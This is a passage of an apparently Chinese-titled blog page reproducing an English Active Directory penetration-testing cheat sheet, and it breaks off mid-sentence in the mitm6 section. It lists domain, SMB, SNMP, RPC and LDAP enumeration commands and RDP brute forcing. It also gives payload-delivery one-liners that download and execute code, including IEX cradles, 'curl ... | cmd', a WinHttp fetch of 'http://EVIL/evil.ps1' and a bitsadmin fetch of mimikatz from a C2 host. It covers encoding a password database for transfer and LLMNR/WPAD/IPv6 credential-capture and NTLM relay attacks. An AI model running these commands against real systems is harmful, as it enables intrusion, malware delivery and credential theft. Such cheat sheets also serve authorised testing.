href="#1-1-3-红队CSharp脚本" class="headerlink" title="1.1.3 红队CSharp脚本"></a>1.1.3 红队CSharp脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts</span><br><span class="line"></span><br><span class="line">LDAPUtility.cs</span><br><span class="line"></span><br><span class="line">Usage: ldaputility.exe options domain [arguments]</span><br><span class="line"></span><br><span class="line">ldaputility.exe DumpAllUsers m0chan</span><br><span class="line">ldaputility.exe DumpUser m0chan mr.un1k0d3r</span><br><span class="line">ldaputility.exe DumpUsersEmail m0chan</span><br><span class="line">ldaputility.exe DumpAllComputers m0chan </span><br><span class="line">ldaputility.exe DumpComputer m0chan DC01</span><br><span class="line">ldaputility.exe DumpAllGroups m0chan</span><br><span class="line">ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;</span><br><span class="line">ldaputility.exe DumpPasswordPolicy m0chan</span><br><span class="line"></span><br><span class="line">Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.</span><br><span class="line"></span><br><span class="line">See github linked above for full details.</span><br></pre></td></tr></table></figure><h3 id="1-1-4-活动目录"><a href="#1-1-4-活动目录" class="headerlink" title="1.1.4 活动目录"></a>1.1.4 活动目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:DomainName</span><br><span class="line">nltest /DCNAME:DomainName</span><br><span class="line">nltest /DSGETDC:DomainName</span><br><span class="line"></span><br><span class="line"># Get Current Domain Info - Similar to Get-Domain</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"># Get Domain Trust Info - Similar to Get-DomainTrust</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View Domain Info</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"></span><br><span class="line">#  View Domain Trust Information</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line">nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /v</span><br><span class="line"></span><br><span class="line">nltest /dsgetfti:&lt;domain&gt;</span><br><span class="line"></span><br><span class="line">nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts</span><br><span class="line"></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View All Domain Controllers</span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line"># View DC for Current Session</span><br><span class="line">nltest /dsgetdc:m0chanAD.local</span><br><span class="line"></span><br><span class="line"># View Domain Trusts from CMD</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># View User Info from CMD</span><br><span class="line">nltest /user:&quot;m0chan&quot;</span><br><span class="line"></span><br><span class="line"># get domain name and DC the user authenticated to</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># Get All Logged on Sessions, Includes NTLM &amp; Kerberos</span><br><span class="line">klist sessions</span><br><span class="line"></span><br><span class="line"># View Kerb Tickets</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># View Cached Krbtgt</span><br><span class="line">klist tgt</span><br><span class="line"></span><br><span class="line"># whoami on older Windows systems</span><br><span class="line">set u</span><br><span class="line"></span><br><span class="line">#List all Usernames</span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List Administrators</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List all Info about Specific User</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties</span><br><span class="line"></span><br><span class="line">#View All Users with Description Field Set</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125;</span><br></pre></td></tr></table></figure><h3 id="1-1-5-从Linux-Box进行AD枚举-AD工具"><a href="#1-1-5-从Linux-Box进行AD枚举-AD工具" class="headerlink" title="1.1.5 从Linux Box进行AD枚举-AD工具"></a>1.1.5 从Linux Box进行AD枚举-AD工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jasonwbarnett/linux-adtool</span><br><span class="line"></span><br><span class="line">tar zxvf adtools-1.x.tar.gz</span><br><span class="line">cd adtools-1.x</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">&gt; adtool list ou=user,dc=example,dc=com</span><br><span class="line">CN=allusers,OU=user,DC=example,DC=com</span><br><span class="line">OU=finance,OU=user,DC=example,DC=com</span><br><span class="line">OU=administration,OU=user,DC=example,DC=com</span><br><span class="line"></span><br><span class="line">&gt; adtool oucreate marketing ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool setpass jsmith banana</span><br><span class="line">&gt; adtool unlock jsmith</span><br><span class="line">&gt; adtool groupadd allusers jsmith</span><br><span class="line">&gt; adtool attributereplace jsmith telephonenumber 123</span><br><span class="line">&gt; adtool attributereplace jsmith mail jsmith@example.com</span><br></pre></td></tr></table></figure><h3 id="1-1-6-SharpView枚举"><a href="#1-1-6-SharpView枚举" class="headerlink" title="1.1.6 SharpView枚举"></a>1.1.6 SharpView枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/tevora-threat/SharpView</span><br><span class="line"></span><br><span class="line">Get-DomainFileServer</span><br><span class="line">Get-DomainGPOUserLocalGroupMapping</span><br><span class="line">Find-GPOLocation</span><br><span class="line">Get-DomainGPOComputerLocalGroupMapping</span><br><span class="line">Find-GPOComputerAdmin</span><br><span class="line">Get-DomainObjectAcl</span><br><span class="line">Get-ObjectAcl</span><br><span class="line">Add-DomainObjectAcl</span><br><span class="line">Add-ObjectAcl</span><br><span class="line">Remove-DomainObjectAcl</span><br><span class="line">Get-RegLoggedOn</span><br><span class="line">Get-LoggedOnLocal</span><br><span class="line">Get-NetRDPSession</span><br><span class="line">Test-AdminAccess</span><br><span class="line">Invoke-CheckLocalAdminAccess</span><br><span class="line">Get-WMIProcess</span><br><span class="line">Get-NetProcess</span><br><span class="line">Get-WMIRegProxy</span><br><span class="line">Get-Proxy</span><br><span class="line">Get-WMIRegLastLoggedOn</span><br><span class="line">Get-LastLoggedOn</span><br><span class="line">Get-WMIRegCachedRDPConnection</span><br><span class="line">Get-CachedRDPConnection</span><br><span class="line">Get-WMIRegMountedDrive</span><br><span class="line">Get-RegistryMountedDrive</span><br><span class="line">Find-InterestingDomainAcl</span><br><span class="line">Invoke-ACLScanner</span><br><span class="line">Get-NetShare</span><br><span class="line">Get-NetLoggedon</span><br></pre></td></tr></table></figure><h3 id="1-1-7-SMB枚举"><a href="#1-1-7-SMB枚举" class="headerlink" title="1.1.7 SMB枚举"></a>1.1.7 SMB枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls</span><br><span class="line">enum4linux 1.3.3.7</span><br><span class="line">smbmap -H 1.3.3.7</span><br><span class="line">smbclient -L \\INSERTIPADDRESS</span><br><span class="line">smbclient -L INSERTIPADDRESS</span><br><span class="line">smbclient //INSERTIPADDRESS/tmp</span><br><span class="line">smbclient \\\\INSERTIPADDRESS\\ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/admin$ -U john</span><br><span class="line">nbtscan [SUBNET]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Check for SMB Signing</span><br><span class="line">nmap --script smb-security-mode.nse -p 445 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-8-SNMP枚举"><a href="#1-1-8-SNMP枚举" class="headerlink" title="1.1.8 SNMP枚举"></a>1.1.8 SNMP枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -c public -v1 10.10.14.14</span><br><span class="line">snmpcheck -t 10.10.14.14 -c public</span><br><span class="line">onesixtyone -c names -i hosts</span><br><span class="line">nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt</span><br><span class="line">snmpenum -t 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-9-MySQL枚举"><a href="#1-1-9-MySQL枚举" class="headerlink" title="1.1.9 MySQL枚举"></a>1.1.9 MySQL枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</span><br></pre></td></tr></table></figure><h3 id="1-1-10-DNS区域转移"><a href="#1-1-10-DNS区域转移" class="headerlink" title="1.1.10 DNS区域转移"></a>1.1.10 DNS区域转移</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr blah.com @ns1.m0chan.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d m0chan.com</span><br><span class="line">dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span><br></pre></td></tr></table></figure><h3 id="1-1-11-LDAP"><a href="#1-1-11-LDAP" class="headerlink" title="1.1.11 LDAP"></a>1.1.11 LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://&lt;ip&gt;</span><br><span class="line">ldapwhoami</span><br></pre></td></tr></table></figure><h3 id="1-1-12-RPC枚举"><a href="#1-1-12-RPC枚举" class="headerlink" title="1.1.12 RPC枚举"></a>1.1.12 RPC枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;10.10.14.14&quot;</span><br><span class="line">srvinfo</span><br><span class="line">enumdomusers</span><br><span class="line">enumalsgroups domain</span><br><span class="line">lookupnames administrators</span><br><span class="line">querydominfo</span><br><span class="line">enumdomusers</span><br><span class="line">queryuser &lt;user&gt;</span><br><span class="line">lsaquery</span><br><span class="line">lookupnames Guest</span><br><span class="line">lookupnames Administrator</span><br></pre></td></tr></table></figure><h3 id="1-1-13-远程桌面"><a href="#1-1-13-远程桌面" class="headerlink" title="1.1.13 远程桌面"></a>1.1.13 远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u guest -p guest INSERTIPADDRESS -g 94%</span><br><span class="line"></span><br><span class="line"># Brute force</span><br><span class="line">ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h1 id="0x02-文件传输"><a href="#0x02-文件传输" class="headerlink" title="0x02 文件传输"></a>0x02 文件传输</h1><h2 id="2-1-TFTP"><a href="#2-1-TFTP" class="headerlink" title="2.1 TFTP"></a>2.1 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m0chan Machine</span><br><span class="line">mkdir tftp</span><br><span class="line">atftpd --deamon --port 69 tftp</span><br><span class="line">cp *file* tftp</span><br><span class="line">On victim machine:</span><br><span class="line">tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;</span><br></pre></td></tr></table></figure><h2 id="2-2-FTP"><a href="#2-2-FTP" class="headerlink" title="2.2 FTP"></a>2.2 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open &lt;[IP]&gt; 21 &gt; ftp.txt</span><br><span class="line">echo USER demo &gt;&gt; ftp.txt</span><br><span class="line">echo ftp &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure><h2 id="2-3-VBS-Script"><a href="#2-3-VBS-Script" class="headerlink" title="2.3 VBS Script"></a>2.3 VBS Script</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cscript wget.vbs &lt;url&gt; &lt;out_file&gt;</span><br><span class="line"></span><br><span class="line">Use echoup function on pentest.ws to generate echo commands.</span><br><span class="line">https://pentest.ws/features</span><br></pre></td></tr></table></figure><h2 id="2-4-Powershell"><a href="#2-4-Powershell" class="headerlink" title="2.4 Powershell"></a>2.4 Powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles</span><br><span class="line"></span><br><span class="line">Invoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;</span><br><span class="line"></span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) </span><br><span class="line"></span><br><span class="line">#Powershell Download to Memory</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).downloadString(&apos;http://server/script.ps1&apos;)</span><br><span class="line"></span><br><span class="line">#Powershell with Proxy</span><br><span class="line"></span><br><span class="line">$browser = New-Object System.Net.WebClient;</span><br><span class="line">$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</span><br><span class="line">IEX($browser.DownloadString(&apos;https://server/script.ps1&apos;));</span><br></pre></td></tr></table></figure><h2 id="2-5-Powershell-Base64"><a href="#2-5-Powershell-Base64" class="headerlink" title="2.5 Powershell Base64"></a>2.5 Powershell Base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fileName = &quot;Passwords.kdbx&quot;</span><br><span class="line">$fileContent = get-content $fileName</span><br><span class="line">$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)</span><br><span class="line">$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)</span><br><span class="line">$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)</span><br></pre></td></tr></table></figure><h2 id="2-6-安全复制-pscp-exe"><a href="#2-6-安全复制-pscp-exe" class="headerlink" title="2.6 安全复制/ pscp.exe"></a>2.6 安全复制/ pscp.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt</span><br><span class="line">pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt</span><br></pre></td></tr></table></figure><h2 id="2-7-BitsAdmin-exe"><a href="#2-7-BitsAdmin-exe" class="headerlink" title="2.7 BitsAdmin.exe"></a>2.7 BitsAdmin.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="2-8-Remote-Desktop"><a href="#2-8-Remote-Desktop" class="headerlink" title="2.8 Remote Desktop"></a>2.8 Remote Desktop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.10 -r disk:linux=&apos;/home/user/filetransferout&apos;</span><br></pre></td></tr></table></figure><h2 id="2-9-WinHTTP-Com-Object"><a href="#2-9-WinHTTP-Com-Object" class="headerlink" title="2.9 WinHTTP Com Object"></a>2.9 WinHTTP Com Object</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[System.Net.WebRequest]::DefaultWebProxy</span><br><span class="line">[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&apos;GET&apos;,&apos;http://EVIL/evil.ps1&apos;,$false);$h.send();iex $h.responseText</span><br></pre></td></tr></table></figure><h2 id="2-10-CertUtil"><a href="#2-10-CertUtil" class="headerlink" title="2.10 CertUtil"></a>2.10 CertUtil</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#File Transfer</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename</span><br><span class="line"></span><br><span class="line">#CertUtil Base64 Transfers</span><br><span class="line"></span><br><span class="line">certutil.exe -encode inputFileName encodedOutputFileName</span><br><span class="line">certutil.exe -decode encodedInputFileName decodedOutputFileName</span><br></pre></td></tr></table></figure><h2 id="2-11-Curl-Windows-1803"><a href="#2-11-Curl-Windows-1803" class="headerlink" title="2.11 Curl (Windows 1803+)"></a>2.11 Curl (Windows 1803+)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://server/file -o file</span><br><span class="line">curl http://server/file.bat | cmd</span><br><span class="line"></span><br><span class="line">IEX(curl http://server/script.ps1);Invoke-Blah</span><br></pre></td></tr></table></figure><h2 id="2-12-SMB"><a href="#2-12-SMB" class="headerlink" title="2.12 SMB"></a>2.12 SMB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support</span><br></pre></td></tr></table></figure><h1 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h1><h2 id="3-1-LLMNR-NBT-NS欺骗"><a href="#3-1-LLMNR-NBT-NS欺骗" class="headerlink" title="3.1 LLMNR / NBT-NS欺骗"></a>3.1 LLMNR / NBT-NS欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Responder to Steal Creds</span><br><span class="line"></span><br><span class="line">git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like</span><br><span class="line"></span><br><span class="line">&apos;Yeah I&apos;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&apos;</span><br></pre></td></tr></table></figure><h2 id="3-2-Responder-WPAD-Attack"><a href="#3-2-Responder-WPAD-Attack" class="headerlink" title="3.2 Responder WPAD Attack"></a>3.2 Responder WPAD Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 wpad</span><br><span class="line"></span><br><span class="line">By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet</span><br><span class="line"></span><br><span class="line">Go to internet explorer and search for Google which automatically searches for a WPAD file... </span><br><span class="line"></span><br><span class="line">Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.</span><br></pre></td></tr></table></figure><h2 id="3-3-mitm6"><a href="#3-3-mitm6" class="headerlink" title="3.3 mitm6"></a>3.3 mitm6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. </span><br><span class="line"></span><br><span class="line">By default IPV6 should be enabled. </span><br><span class="line">git clone https://github.com/fox-it/mitm6.git </span><br><span class="line">cd /opt/tools/mitm6</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line">mitm6 -d m0chanAD.local</span><br><span class="line"></span><br><span class="line">Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. </span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i</span><br><span class="line"></span><br><span class="line">-i opens an interactive shell.</span><br><span class="line"></span><br><span class="line">Shout out to hausec for this super nice 